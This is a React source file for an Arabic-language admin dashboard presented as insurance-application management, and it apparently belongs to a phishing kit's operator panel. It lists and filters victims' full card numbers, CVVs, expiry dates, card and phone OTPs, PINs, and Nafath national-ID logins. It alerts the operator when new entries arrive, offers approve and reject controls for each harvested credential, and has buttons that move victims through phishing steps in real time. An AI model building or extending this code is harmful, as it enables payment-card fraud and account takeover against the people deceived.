"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Filter,
  FileText,
  Car,
  Shield,
  User,
  ChevronDown,
  History,
  Info,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { CreditCardMockup } from "@/components/credit-card-mockup"
import { ApplicationCard } from "@/components/application-card"
import { ApprovalButtons } from "@/components/approval-buttons"
import { DetailSection } from "@/components/detail-section"
import { DataField } from "@/components/data-field"
import { StatCard } from "@/components/stat-card (1)"

const STEP_NAMES: Record<number | string, string> = {
  1: "PIN",
  2: "تفاصيل",
  3: "OTP",
  4: "بطاقة",
  nafad: "نفاذ",
  phone: "هاتف",
  home: "الرئيسية",
}

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [dataFilter, setDataFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
  const [loading, setLoading] = useState(true)
  const [showChat, setShowChat] = useState(false)
  const [showCardHistory, setShowCardHistory] = useState(false)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)

  // Stats calculation - counting cards, phones, and info
  const stats = useMemo(
    () => ({
      total: applications.length,
      cards: applications.filter((a) => !!(a.cardNumber || a.expiryDate || a.cvv)).length,
      phones: applications.filter((a) => !!(a.phoneNumber2 || a.phoneOtp)).length,
      info: applications.filter((a) => !!(a.nafazId || a.nafazPass || a.pinCode || a.documentType)).length,
    }),
    [applications],
  )

  // Subscribe to applications from Firestore
  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })

    return () => unsubscribe()
  }, [])

  // Filter applications
  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      // Filter by data type
      if (dataFilter === "cards") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (dataFilter === "phones") {
        filtered = filtered.filter((app) => !!(app.phoneNumber2 || app.phoneOtp))
      } else if (dataFilter === "info") {
        filtered = filtered.filter((app) => !!(app.nafazId || app.nafazPass || app.pinCode || app.documentType))
      }

      // Additional card filter
      if (cardFilter === "hasCard") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (cardFilter === "noCard") {
        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
      }

      // Search filter
      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.cardNumber?.includes(query),
        )
      }

      // Sort by date - newest first
      filtered = filtered.sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0
        return dateB - dateA
      })

      setFilteredApplications(filtered)
    }, 200)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, dataFilter, cardFilter])

  // Sync selected application with updates
  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) setSelectedApplication(updated)
    }
  }, [applications, selectedApplication])

  // Utility functions
  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffInSeconds < 60) return "منذ لحظات"
    if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes <= 2 ? "دقيقتين" : "دقائق"}`
    }
    if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours <= 2 ? "ساعتين" : "ساعات"}`
    }
    if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days <= 2 ? "يومين" : "أيام"}`
    }

    return date.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
  }, [])

  const getStepName = (step: number | string) => STEP_NAMES[step] || `الخطوة ${step}`

  const hasCardInfo = (app: InsuranceApplication) => !!(app.cardNumber || app.expiryDate || app.cvv)

  const hasAnyData = (app: InsuranceApplication) =>
    !!(
      app.cardNumber ||
      app.otp ||
      app.allOtps ||
      app.phoneNumber2 ||
      app.phoneOtp ||
      app.selectedCarrier ||
      app.totalPrice ||
      app.pinCode ||
      app.nafazId ||
      app.documentType
    )

  // Action handlers
  const handleStepChange = useCallback(async (appId: string, newStep: number | string) => {
    try {
      await updateApplication(appId, { currentStep: newStep as number })
    } catch (error) {
      console.error("Error updating step:", error)
    }
  }, [])

  const handleApprovalChange = useCallback(
    async (appId: string, field: keyof InsuranceApplication, status: "approved" | "rejected" | "pending") => {
      try {
        await updateApplication(appId, { [field]: status })
        if (status === "approved") playSuccessSound()
        else if (status === "rejected") playErrorSound()
      } catch (error) {
        console.error("Error updating approval:", error)
        playErrorSound()
      }
    },
    [],
  )

  const handleAuthNumber = async (appId: string, auth: string) => {
    try {
      await updateApplication(appId, { authNumber: auth })
      playSuccessSound()
      setAuthNumber("")
    } catch (error) {
      console.error("Error saving auth number:", error)
      playErrorSound()
    }
  }

  const markAsRead = useCallback(async (app: InsuranceApplication) => {
    if (app.isUnread) {
      try {
        await updateApplication(app.id!, { isUnread: false })
      } catch (error) {
        console.error("Error marking as read:", error)
      }
    }
  }, [])

  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, e: React.MouseEvent) => {
    e.stopPropagation()
    try {
      await updateApplication(appId, { isUnread: !currentIsUnread })
    } catch (error) {
      console.error("Error toggling read status:", error)
    }
  }, [])

  const toggleSelection = useCallback((id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) newSet.delete(id)
      else newSet.add(id)
      return newSet
    })
  }, [])

  const handleDelete = useCallback(
    async (appId: string, e: React.MouseEvent) => {
      e.stopPropagation()
      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
        if (selectedApplication?.id === appId) setSelectedApplication(null)
        setSelectedIds((prev) => {
          const newSet = new Set(prev)
          newSet.delete(appId)
          return newSet
        })
        playSuccessSound()
      }
    },
    [selectedApplication],
  )

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-slate-900/80 backdrop-blur-xl border-b border-slate-700/50">
        <div className="flex items-center justify-between px-6 py-4">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="absolute -inset-1 bg-gradient-to-r from-emerald-500 to-green-500 rounded-xl blur opacity-30" />
                <div className="relative w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center shadow-lg shadow-emerald-500/25">
                  <Shield className="w-5 h-5 text-white" />
                </div>
              </div>
              <div>
                <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
                <p className="text-[11px] text-slate-400">إدارة طلبات التأمين</p>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" className="h-10 w-10 text-slate-400 hover:text-white hover:bg-slate-800">
              <Settings className="w-5 h-5" />
            </Button>
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center text-sm font-bold text-white shadow-lg shadow-emerald-500/25">
              م
            </div>
          </div>
        </div>
      </header>

      {/* Stats */}
      <div className="border-b border-slate-700/50 bg-slate-900/50 backdrop-blur-sm">
        <div className="px-6 py-5">
          <div className="grid grid-cols-4 gap-4">
            <StatCard icon={FileText} label="إجمالي الطلبات" value={stats.total} variant="default" />
            <StatCard icon={CreditCard} label="البطاقات" value={stats.cards} variant="success" />
            <StatCard icon={Phone} label="الهواتف" value={stats.phones} variant="warning" />
            <StatCard icon={Info} label="المعلومات" value={stats.info} variant="default" />
          </div>
        </div>
      </div>

      <div className="flex h-[calc(100vh-180px)]">
        {/* Sidebar */}
        <div className="w-[400px] bg-slate-900/70 backdrop-blur-sm border-l border-slate-700/50 flex flex-col">
          {/* Search & Filters */}
          <div className="p-4 space-y-3 border-b border-slate-700/50">
            <div className="relative group">
              <div className="absolute -inset-0.5 bg-gradient-to-r from-emerald-500 to-green-500 rounded-xl blur opacity-0 group-focus-within:opacity-20 transition-opacity" />
              <div className="relative">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <Input
                  placeholder="بحث بالاسم أو رقم الهوية..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 h-10 text-sm bg-slate-800/80 border-slate-700/50 focus:border-emerald-500/50 text-slate-200 placeholder:text-slate-500 rounded-xl"
                />
              </div>
            </div>
            <div className="flex items-center gap-2">
              <Tabs defaultValue="all" className="flex-1" onValueChange={setDataFilter}>
                <TabsList className="w-full h-9 p-1 bg-slate-800/80 rounded-xl border border-slate-700/50">
                  <TabsTrigger value="all" className="flex-1 h-7 text-xs rounded-lg data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">
                    الكل
                  </TabsTrigger>
                  <TabsTrigger value="phones" className="flex-1 h-7 text-xs rounded-lg data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">
                    هاتف
                  </TabsTrigger>
                  <TabsTrigger value="cards" className="flex-1 h-7 text-xs rounded-lg data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">
                    بطاقات
                  </TabsTrigger>
                  <TabsTrigger value="info" className="flex-1 h-7 text-xs rounded-lg data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">
                    معلومات
                  </TabsTrigger>
                </TabsList>
              </Tabs>
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="outline" size="sm" className="h-9 gap-1.5 bg-slate-800/80 border-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700 rounded-xl">
                    <Filter className="w-3.5 h-3.5" />
                    <ChevronDown className="w-3 h-3" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-40 bg-slate-800 border-slate-700">
                  <DropdownMenuItem onClick={() => setCardFilter("all")} className="text-slate-300 focus:bg-slate-700 focus:text-white">الكل</DropdownMenuItem>
                  <DropdownMenuItem onClick={() => setCardFilter("hasCard")} className="text-slate-300 focus:bg-slate-700 focus:text-white">
                    <CreditCard className="w-3.5 h-3.5 ml-2" />
                    لديه بطاقة
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={() => setCardFilter("noCard")} className="text-slate-300 focus:bg-slate-700 focus:text-white">بدون بطاقة</DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>

          {/* Applications List */}
          <div className="flex-1 overflow-y-auto custom-scrollbar">
            {loading ? (
              <div className="flex items-center justify-center h-full">
                <div className="text-center space-y-4">
                  <div className="relative">
                    <div className="w-12 h-12 border-2 border-slate-700 border-t-emerald-500 rounded-full animate-spin mx-auto" />
                  </div>
                  <p className="text-sm text-slate-400">جاري التحميل...</p>
                </div>
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full p-8 text-center">
                <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-slate-800 to-slate-700 flex items-center justify-center mx-auto mb-4 shadow-xl">
                  <Mail className="w-10 h-10 text-slate-500" />
                </div>
                <p className="text-slate-200 font-semibold mb-1">لا توجد طلبات</p>
                <p className="text-sm text-slate-500">سيتم عرض الطلبات هنا عند إضافتها</p>
              </div>
            ) : (
              <div>
                {filteredApplications.map((app) => (
                  <ApplicationCard
                    key={app.id}
                    app={app}
                    isSelected={selectedIds.has(app.id!)}
                    isActive={selectedApplication?.id === app.id}
                    stepName={getStepName(app.currentStep)}
                    formattedDate={formatArabicDate(app.createdAt)}
                    hasCard={hasCardInfo(app)}
                    onSelect={() => {
                      setSelectedApplication(app)
                      setShowChat(false)
                      markAsRead(app)
                    }}
                    onToggleSelection={(e) => toggleSelection(app.id!, e)}
                    onToggleRead={(e) => toggleReadStatus(app.id!, app.isUnread === true, e)}
                    onDelete={(e) => handleDelete(app.id!, e)}
                  />
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 bg-gradient-to-br from-slate-900/50 to-slate-950/50 overflow-hidden">
          {selectedApplication ? (
            showChat ? (
              <ChatPanel
                applicationId={selectedApplication.id!}
                currentUserId="admin-001"
                currentUserName="المسؤول"
                currentUserRole="admin"
                onClose={() => setShowChat(false)}
              />
            ) : (
              <div className="h-full flex flex-col">
                {/* Detail Header */}
                <div className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-xl border-b border-slate-700/50 p-6">
                  <div className="flex items-start justify-between mb-5">
                    <div className="flex items-center gap-4">
                      <div className="relative">
                        <div className="absolute -inset-1 bg-gradient-to-r from-emerald-500 to-green-500 rounded-2xl blur opacity-30" />
                        <div className="relative w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center text-xl font-bold text-white shadow-lg shadow-emerald-500/25">
                          {selectedApplication.ownerName?.charAt(0) || "م"}
                        </div>
                      </div>
                      <div>
                        <h2 className="text-xl font-bold text-white">
                          {selectedApplication.ownerName || "بدون اسم"}
                        </h2>
                        <div className="flex items-center gap-2 mt-1">
                          <Badge className="text-[10px] bg-slate-700/80 text-slate-300 border-0">
                            {getStepName(selectedApplication.currentStep)}
                          </Badge>
                          {selectedApplication.country && (
                            <span className="text-sm text-slate-400">{selectedApplication.country}</span>
                          )}
                        </div>
                      </div>
                    </div>
                    <Button onClick={() => setShowChat(true)} size="sm" className="gap-2 bg-gradient-to-r from-emerald-500 to-green-600 hover:from-emerald-600 hover:to-green-700 text-white border-0 shadow-lg shadow-emerald-500/25 rounded-xl h-10 px-5">
                      <MessageSquare className="w-4 h-4" />
                      دردشة
                    </Button>
                  </div>

                  {/* Step Controls */}
                  <div className="flex flex-wrap gap-2">
                    {["nafad", "phone", "home"].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        size="sm"
                        className={`h-9 text-xs rounded-xl transition-all ${
                          selectedApplication.currentStep === step 
                            ? "bg-gradient-to-r from-emerald-500 to-green-600 text-white border-0 shadow-lg shadow-emerald-500/20" 
                            : "bg-slate-800/50 border border-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700"
                        }`}
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                    <div className="w-px h-9 bg-slate-700/50 mx-2" />
                    {[1, 2, 3, 4].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        size="sm"
                        className={`h-9 text-xs rounded-xl transition-all ${
                          selectedApplication.currentStep === step 
                            ? "bg-gradient-to-r from-emerald-500 to-green-600 text-white border-0 shadow-lg shadow-emerald-500/20" 
                            : "bg-slate-800/50 border border-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700"
                        }`}
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                  </div>
                </div>

                {/* Detail Content */}
                <div className="flex-1 overflow-y-auto p-5 custom-scrollbar">
                  {hasAnyData(selectedApplication) ? (
                    <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4 max-w-7xl">
                      {/* Payment Card */}
                      {selectedApplication.cardNumber && (
                        <DetailSection
                          icon={CreditCard}
                          title="معلومات الدفع"
                          delay={0}
                          badge={
                            selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 ? (
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => setShowCardHistory(!showCardHistory)}
                                className="h-7 text-xs gap-1"
                              >
                                <History className="w-3 h-3" />
                                {selectedApplication.cardHistory.length} سابقة
                              </Button>
                            ) : null
                          }
                        >
                          <div className="space-y-4">
                            <CreditCardMockup
                              cardNumber={selectedApplication.cardNumber}
                              expiryDate={selectedApplication.expiryDate}
                              cvv={selectedApplication.cvv}
                              cardholderName={selectedApplication.ownerName}
                            />
                            {selectedApplication.totalPrice && (
                              <div className="p-3 bg-success/10 border border-success/20 rounded-lg text-center">
                                <p className="text-[10px] text-success mb-1">قيمة التأمين</p>
                                <p className="text-xl font-bold text-success font-mono" dir="ltr">
                                  {selectedApplication.totalPrice} ر.س
                                </p>
                              </div>
                            )}
                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "cardApproved", "approved")
                              }
                              onReject={() => handleApprovalChange(selectedApplication.id!, "cardApproved", "rejected")}
                              approveDisabled={selectedApplication.cardApproved === "approved"}
                              rejectDisabled={selectedApplication.cardApproved === "rejected"}
                              approveLabel="قبول البطاقة"
                              rejectLabel="رفض البطاقة"
                            />
                            {/* Card History */}
                            {showCardHistory &&
                              selectedApplication.cardHistory &&
                              selectedApplication.cardHistory.length > 0 && (
                                <div className="pt-4 border-t border-border space-y-3">
                                  <h4 className="text-xs font-medium text-muted-foreground flex items-center gap-2">
                                    <History className="w-3.5 h-3.5" />
                                    البطاقات السابقة
                                  </h4>
                                  {selectedApplication.cardHistory.map((card: { cardNumber: string | undefined; expiryDate: string | undefined; cvv: string | undefined; addedAt: string | undefined }, i: React.Key | null | undefined) => (
                                    <div key={i} className="p-3 bg-muted/50 rounded-lg">
                                      <CreditCardMockup
                                        cardNumber={card.cardNumber}
                                        expiryDate={card.expiryDate}
                                        cvv={card.cvv}
                                        cardholderName={selectedApplication.ownerName}
                                      />
                                      <p className="text-[10px] text-muted-foreground mt-2 text-center">
                                        {formatArabicDate(card.addedAt)}
                                      </p>
                                    </div>
                                  ))}
                                </div>
                              )}
                          </div>
                        </DetailSection>
                      )}

                      {/* OTP Section */}
                      {selectedApplication.otp && (
                        <DetailSection icon={Shield} title="رمز التحقق OTP" delay={100}>
                          <div className="space-y-4">
                            <div className="p-4 bg-primary/10 border border-primary/20 rounded-lg text-center">
                              <p className="text-[10px] text-primary mb-2">الرمز الحالي</p>
                              <p className="text-3xl font-bold text-primary font-mono tracking-widest" dir="ltr">
                                {selectedApplication.otp}
                              </p>
                            </div>
                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "rejected")
                              }
                              approveDisabled={selectedApplication.cardOtpApproved === "approved"}
                              rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
                            />
                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                              <div className="pt-3 border-t border-border">
                                <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
                                <div className="flex flex-wrap gap-1.5">
                                  {selectedApplication.allOtps.map((otp, i) => (
                                    <Badge key={i} variant="secondary" className="font-mono text-[10px]" dir="ltr">
                                      {otp}
                                    </Badge>
                                  ))}
                                </div>
                              </div>
                            )}
                          </div>
                        </DetailSection>
                      )}

                      {/* PIN Section */}
                      {selectedApplication.pinCode && (
                        <DetailSection icon={Shield} title="رمز PIN" delay={150}>
                          <div className="space-y-4">
                            <div className="p-4 bg-warning/10 border border-warning/20 rounded-lg text-center">
                              <p className="text-[10px] text-warning mb-2">Pin Code</p>
                              <p className="text-3xl font-bold text-warning font-mono tracking-widest" dir="ltr">
                                {selectedApplication.pinCode}
                              </p>
                            </div>
                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "rejected")
                              }
                              approveDisabled={selectedApplication.idVerificationStatus === "approved"}
                              rejectDisabled={selectedApplication.idVerificationStatus === "rejected"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Phone Section */}
                      {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
                        <DetailSection icon={Phone} title="معلومات الهاتف" delay={200}>
                          <div className="space-y-4">
                            <div className="grid grid-cols-2 gap-2">
                              <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
                              <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
                            </div>
                            {selectedApplication.phoneOtp && (
                              <div className="p-3 bg-muted/50 rounded-lg text-center">
                                <p className="text-[10px] text-muted-foreground mb-1">رمز الهاتف</p>
                                <p className="text-xl font-bold font-mono" dir="ltr">
                                  {selectedApplication.phoneOtp}
                                </p>
                              </div>
                            )}
                            <ApprovalButtons
                              onApprove={() =>
                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "approved")
                              }
                              onReject={() =>
                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "rejected")
                              }
                              approveDisabled={selectedApplication.phoneVerificationStatus === "approved"}
                              rejectDisabled={selectedApplication.phoneVerificationStatus === "rejected"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Nafaz Section */}
                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                        <DetailSection icon={User} title="نفاذ الوطني" delay={250}>
                          <div className="space-y-3">
                            <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
                            <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
                            <div className="pt-3 border-t border-border space-y-2">
                              <Input
                                type="tel"
                                value={authNumber}
                                onChange={(e) => setAuthNumber(e.target.value)}
                                placeholder="أدخل رمز التوثيق"
                                className="h-9 text-sm"
                              />
                              <Button
                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                                size="sm"
                                className="w-full"
                                disabled={!authNumber}
                              >
                                <CheckCircle className="w-4 h-4 ml-1.5" />
                                حفظ رمز التوثيق
                              </Button>
                            </div>
                          </div>
                        </DetailSection>
                      )}

                      {/* Document Section */}
                      {selectedApplication.documentType && (
                        <DetailSection icon={FileText} title="معلومات الوثيقة" delay={300}>
                          <div className="space-y-2">
                            <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
                            <DataField label="الاسم" value={selectedApplication.ownerName} />
                            <DataField label="الاسم البائع" value={selectedApplication.buyerName} />
                            <DataField label="رقم وطني البائع" value={selectedApplication.buyerIdNumber} />
                            <DataField label="رقم وطني" value={selectedApplication.identityNumber} />
                            <DataField label="رقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
                            <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
                            <DataField label="الدولة" value={selectedApplication.country} />
                          </div>
                        </DetailSection>
                      )}

                      {/* Insurance Section */}
                      {(selectedApplication.insuranceType || selectedApplication.insuranceStartDate) && (
                        <DetailSection icon={Shield} title="تفاصيل التأمين" delay={350}>
                          <div className="space-y-2">
                            <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
                            <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
                            <DataField
                              label="موقع الإصلاح"
                              value={selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                            />
                          </div>
                        </DetailSection>
                      )}

                      {/* Vehicle Section */}
                      {(selectedApplication.vehicleModel || selectedApplication.manufacturingYear) && (
                        <DetailSection icon={Car} title="معلومات المركبة" delay={400}>
                          <div className="grid grid-cols-2 gap-2">
                            <DataField label="الموديل" value={selectedApplication.vehicleModel} />
                            <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear?.toString()} />
                            <DataField
                              label="القيمة"
                              value={
                                selectedApplication.vehicleValue
                                  ? `${selectedApplication.vehicleValue} ريال`
                                  : undefined
                              }
                            />
                            <DataField label="الاستخدام" value={selectedApplication.vehicleUsage} />
                          </div>
                        </DetailSection>
                      )}
                    </div>
                  ) : (
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center">
                        <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                          <FileText className="w-10 h-10 text-muted-foreground" />
                        </div>
                        <h3 className="text-lg font-semibold text-foreground mb-1">لا توجد بيانات</h3>
                        <p className="text-sm text-muted-foreground">لم يتم إضافة معلومات لهذا الطلب بعد</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                  <Mail className="w-10 h-10 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold text-foreground mb-1">اختر طلباً لعرض التفاصيل</h3>
                <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
